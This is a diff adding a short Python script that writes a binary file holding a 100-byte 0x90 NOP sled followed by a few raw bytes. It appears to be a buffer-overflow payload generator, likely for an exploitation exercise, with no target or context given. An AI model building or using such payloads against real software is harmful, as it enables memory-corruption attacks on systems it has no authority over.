@@ -1,0 +1,8 @@
+#!/usr/bin/python
+
+import sys
+
+with open(sys.argv[1], 'wb') as f:
+	f.write("\x90"*100)
+	f.write("\x0b\xc7\x80\x50\x00\x03\x13\x63\x12\x60")
+#	f.write("\xbc\x78\x05\x00\x00\x31\x36\x31\x26")
